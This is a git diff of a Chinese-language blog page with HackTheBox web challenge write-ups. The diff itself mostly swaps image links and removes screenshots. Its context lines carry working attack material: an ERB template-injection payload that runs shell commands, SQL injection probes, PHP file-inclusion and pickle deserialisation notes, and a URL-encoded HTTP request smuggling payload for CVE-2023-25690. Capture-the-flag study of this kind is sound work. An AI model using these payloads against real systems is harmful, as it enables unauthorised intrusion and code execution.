@@ -102,12 +102,12 @@ look hui = c0iq = lookhui</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclx6phq6j20zk0m8e36.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipev1x5e4j20zk0m8b29.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicm0fdw5cj20zk0m8hdt.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipevarprfj20zk0m8npd.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipesrnqv3j20zk0m8ava.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclil3m4ej20zk0m8tn8.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeybxm1pj20zk0m8niv.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclgrvbd6j20zk0m8qv5.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giciundwu5j20zk0m8n9e.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giciusoyjnj219g0u0x56.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclimtf7dj20zk0m8qav.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeuv80yoj20zk0m8kjl.jpg"></li>
         </ul>
       </div>
     </header>
@@ -166,7 +166,7 @@ look hui = c0iq = lookhui</title>
 <p>我们去看这个 pageMode1</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class PageModel</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line"></span><br><span class="line">    public function __destruct() </span><br><span class="line">    &#123;</span><br><span class="line">        include($this-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>发现这个编码使用的是一个__destruct () 来进行包含查看源码，index.php 里面还给了 file 进行了定义值，并且 cookie 处来设定，并且只是使用了一个 base64 来进行加密，我们去访问网站把 cookie copy 一下进行解码</p>
-<p><img data-src="%5Cpic%5Cimage-20231208154207149.png" alt="image-20231208154207149"></p>
+
 <p>这里可以发现这个我们可以利用文件包含来查看任意内容，但是查看 entrypoint.sh 发现初始化时把 flag 给更改为 flag_加 5 个随机字符</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/ash</span><br><span class="line"></span><br><span class="line"># Secure entrypoint</span><br><span class="line">chmod 600 /entrypoint.sh</span><br><span class="line"></span><br><span class="line"># Generate random flag filename</span><br><span class="line">mv /flag /flag_`cat /dev/urandom | tr -dc &#x27;a-zA-Z0-9&#x27; | fold -w 5 | head -n 1`</span><br><span class="line"></span><br><span class="line">exec &quot;$@&quot;</span><br></pre></td></tr></table></figure>
 <p>现在可以想到的方法有去爆破他的 5 位随机字符代码如下</p>
@@ -185,7 +185,7 @@ look hui = c0iq = lookhui</title>
 <p>里面有一个分别为 get 和 post，如果你使用 post 方法的话会进行正则匹配是否为数字和字母如果不是直接等于</p>
 <p>Malicious Input Detected</p>
 <p>如果是的情况下就会在输出一下这个变量，查资料得到这个正则匹配可以通过匹配 %0a 来达到绕过手段也就是说使用 \n 就能绕过和 php 一样，那么直接在 index.erb 里面输入 1%0a&lt;/h1&gt;&lt;%25=open (‘|cat f*’).read ()%25&gt;&lt;h1 &gt; 这样就能达到任意命令执行的效果</p>
-<p><img data-src="%5Cpic%5Cimage-20231208163006608.png" alt="image-20231208163006608"></p>
+
 <p>使用 &lt;%= File.open (‘flag.txt’).read %&gt; 也能得到 flag 但是需要进行 urlencode</p>
 <h3 id="cop"><a class="markdownIt-Anchor" href="#cop">#</a> C.O.P</h3>
 <p>这个代码是 python 写的打开后能发现这个代码 models.py 里面的代码</p>
@@ -194,7 +194,7 @@ look hui = c0iq = lookhui</title>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from flask import g</span><br><span class="line">from application import app</span><br><span class="line">from sqlite3 import dbapi2 as sqlite3</span><br><span class="line">import base64, pickle</span><br><span class="line"></span><br><span class="line">def connect_db():</span><br><span class="line">    return sqlite3.connect(&#x27;cop.db&#x27;, isolation_level=None)</span><br><span class="line">    </span><br><span class="line">def get_db():</span><br><span class="line">    db = getattr(g, &#x27;_database&#x27;, None)</span><br><span class="line">    if db is None:</span><br><span class="line">        db = g._database = connect_db()</span><br><span class="line">        db.row_factory = sqlite3.Row</span><br><span class="line">    return db</span><br><span class="line"></span><br><span class="line">def query_db(query, args=(), one=False):</span><br><span class="line">    with app.app.app_context():</span><br><span class="line">        cur = get_db().execute(query, args)</span><br><span class="line">        rv = [dict((cur.description[idx][0], value) \</span><br><span class="line">            for idx, value in enumerate(row)) for row in cur.fetchall()]</span><br><span class="line">        return (next(iter(rv[0].values())) if rv else None) if one else rv</span><br><span class="line"></span><br><span class="line">class Item:</span><br><span class="line">	def __init__(self, name, description, price, image):</span><br><span class="line">		self.name = name</span><br><span class="line">		self.description = description</span><br><span class="line">		self.image = image</span><br><span class="line">		self.price = price</span><br><span class="line"></span><br><span class="line">def migrate_db():</span><br><span class="line">    items = [</span><br><span class="line">        Item(&#x27;Pickle Shirt&#x27;, &#x27;Get our new pickle shirt!&#x27;, &#x27;23&#x27;, &#x27;/static/images/pickle_shirt.jpg&#x27;),</span><br><span class="line">        Item(&#x27;Pickle Shirt 2&#x27;, &#x27;Get our (second) new pickle shirt!&#x27;, &#x27;27&#x27;, &#x27;/static/images/pickle_shirt2.jpg&#x27;),</span><br><span class="line">        Item(&#x27;Dill Pickle Jar&#x27;, &#x27;Literally just a pickle&#x27;, &#x27;1337&#x27;, &#x27;/static/images/pickle.jpg&#x27;),</span><br><span class="line">        Item(&#x27;Branston Pickle&#x27;, &#x27;Does this even fit on our store?!?!&#x27;, &#x27;7.30&#x27;, &#x27;/static/images/branston_pickle.jpg&#x27;)</span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    with open(&#x27;schema.sql&#x27;, mode=&#x27;r&#x27;) as f:</span><br><span class="line">        shop = map(lambda x: base64.b64encode(pickle.dumps(x)).decode(), items)</span><br><span class="line">        get_db().cursor().executescript(f.read().format(*list(shop)))</span><br></pre></td></tr></table></figure>
 <p>这个 sql 语句能直接产生 sql 注入，还有就是这个 pickle (泡菜) 看到 pickle 我们就能想到 python 的反序列化</p>
 <p>先去页面注入尝试一下</p>
-<p><img data-src="%5Cpic%5Cimage-20231210134014962.png" alt="image-20231210134014962"></p>
+
 <p>发现</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;order by 1--+不报错</span><br><span class="line">1&#x27;order by 2--+直接报错</span><br></pre></td></tr></table></figure>
 <p>那直接使用 sqlmap 跑一次试试，发现使用的是 SQLite 数据库，那么我们就无法直接进行读取文件了，因为 sqlite 无法直接–os-shell，这些表里也没有其他内容，那么进攻点就还有 pickle 了</p>
@@ -216,13 +216,13 @@ look hui = c0iq = lookhui</title>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">func (p RequestData) FetchServerInfo(command string) string &#123;</span><br><span class="line">	out, err := exec.Command(&quot;sh&quot;, &quot;-c&quot;, command).Output()</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return &quot;&quot;</span><br><span class="line">	&#125;</span><br><span class="line">	return string(out)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这里调用了一个 exec.Command 并且是调用的 sh -c 就是命令执行的意思，</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You&#x27;ve found a website that lets you input remote templates for rendering. Your task is to exploit this system&#x27;s vulnerabilities to access and retrieve a hidden flag. Good luck!</span><br></pre></td></tr></table></figure>
-<p>这里也说明了模板渲染，那抓包查看下面的<img data-src="%5Cpic%5Cimage-20231210145451007.png" alt="image-20231210145451007"></p>
+<p>这里也说明了模板渲染，那抓包查看下面的</p>
 <p>这个页面的下面还能跳转我们要的网页，</p>
-<p><img data-src="%5Cpic%5Cimage-20231210145537106.png" alt="image-20231210145537106"></p>
+
 <p>这里使用的抓包可以知道 use_remote=true 并且 page 就是你需要立即渲染的地方，因为内网 ip 无法访问那么我们可以使用 webhook.site 来生成需要的内容接取</p>
-<p><img data-src="%5Cpic%5Cimage-20231210145732624.png" alt="image-20231210145732624"></p>
+
 <p>这里调用了.FetchServerInfo 来直接执行命令，因为我们的目标就是这个</p>
-<p><img data-src="%5Cpic%5Cimage-20231210145837130.png" alt="image-20231210145837130"></p>
+
 <p>命令执行成功，达到目的</p>
 <h3 id="apacheblaze"><a class="markdownIt-Anchor" href="#apacheblaze">#</a> ApacheBlaze</h3>
 <p>Step into the ApacheBlaze universe, a world of arcade clicky games. Rumor has it that by playing certain games, you have the chance to win a grand prize. However, before you can dive into the fun, you’ll need to crack a puzzle.</p>
@@ -234,13 +234,13 @@ look hui = c0iq = lookhui</title>
 <p>查看到了里面有个 url: “/api/games/” + gameName, 我想到了 gameName 换成 click_topia 然后提示 app.py 里面的</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">return jsonify(&#123;</span><br><span class="line">               &#x27;message&#x27;: &#x27;This game is currently available only from dev.apacheblaze.local.&#x27;</span><br><span class="line">           &#125;), 200</span><br></pre></td></tr></table></figure>
 <p>加上 X-Forwarded-Host==dev.apacheblaze.local 还是没有反应，试了很久发现还是不行，查看了大佬的 wp 发现我方法错了</p>
-<p><img data-src="%5Cpic%5Cimage-20231210153436785.png" alt="image-20231210153436785"></p>
+
 <p>应该向去查看 httpd.conf 的语法，里面有一个重定向，并且还设置了一个 proxy 也就说说我刚刚上面那两个其实都是一个，现在很清楚了，端口 1337 和 8080 上的 2 个虚拟主机（反向代理和负载均衡器）在请求处理期间被附加到 X-Forwarded-Host 标头。</p>
 <p>并且大佬还说了利用方法 HTTP 请求走私攻击 (CVE-2023–25690)</p>
 <p>通过这个漏洞，我们了解到我们可以在发送到目标的第一个请求中隐藏第二个请求（使用 <code>\r\n\r</code>  拆分方法）。这使我们能够直接从反向代理发送请求，因此我们不会将其他内容附加到 X-Forwarded-Host 标头的末尾</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET /api/games/click_topia HTTP/1.1</span><br><span class="line">主机：dev.apacheblaze.local </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">主机：localhost:1337 </span><br><span class="line"></span><br><span class="line">-------------------------- ------------</span><br><span class="line"></span><br><span class="line">编码提醒: </span><br><span class="line"></span><br><span class="line">\r\n -&gt; %0d%0a </span><br><span class="line">\r\n\r -&gt; %0d%0a%0d</span><br></pre></td></tr></table></figure>
 <p>进行 url 编码</p>
-<p><img data-src="%5Cpic%5Cimage-20231210154202586.png" alt="image-20231210154202586"></p>
+
 <p>需要注意的是进行常规的 url 编码后无法编码 %0d 需要自己加上去最后是</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/ HTTP/1.1</span><br></pre></td></tr></table></figure>
 <h3 id="proxyasaservice"><a class="markdownIt-Anchor" href="#proxyasaservice">#</a> ProxyAsAService</h3>
@@ -284,7 +284,7 @@ look hui = c0iq = lookhui</title>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">更新于</span>
-    <time title="修改时间：2023-12-13 10:45:35" itemprop="dateModified" datetime="2023-12-13T10:45:35+08:00">2023-12-13</time>
+    <time title="修改时间：2023-12-13 11:19:05" itemprop="dateModified" datetime="2023-12-13T11:19:05+08:00">2023-12-13</time>
   </span>
 </div>
 
@@ -334,7 +334,7 @@ look hui = c0iq = lookhui</title>
     <div class="item left">
       
 
-  <a href="/c0iq/PWN%E5%88%B7%E9%A2%98-md/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipetfk5zwj20zk0m8e81.jpg" title="PWN刷题解析">
+  <a href="/c0iq/PWN%E5%88%B7%E9%A2%98-md/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giph4fomxoj20zk0m8axp.jpg" title="PWN刷题解析">
   <span class="type">上一篇</span>
   <span class="category"><i class="ic i-flag"></i> PWN</span>
   <h3>PWN刷题解析</h3>
@@ -455,10 +455,10 @@ look hui = c0iq = lookhui</title>
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/c0iq/categories/HTB/" title="分类于 HTB">HTB</a>
+<a href="/c0iq/categories/WEB/" title="分类于 WEB">WEB</a>
 </div>
 
-    <span><a href="/c0iq/HTB-WEB-md/" title="HTB-WEB">HTB-WEB</a></span>
+    <span><a href="/c0iq/WEB%E5%88%B7%E9%A2%98-md/" title="WEB刷题解析">WEB刷题解析</a></span>
   </li>
 
       
@@ -475,10 +475,10 @@ look hui = c0iq = lookhui</title>
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/c0iq/categories/WEB/" title="分类于 WEB">WEB</a>
+<a href="/c0iq/categories/HTB/" title="分类于 HTB">HTB</a>
 </div>
 
-    <span><a href="/c0iq/WEB%E5%88%B7%E9%A2%98-md/" title="WEB刷题解析">WEB刷题解析</a></span>
+    <span><a href="/c0iq/HTB-WEB-md/" title="HTB-WEB">HTB-WEB</a></span>
   </li>
 
   </ul>
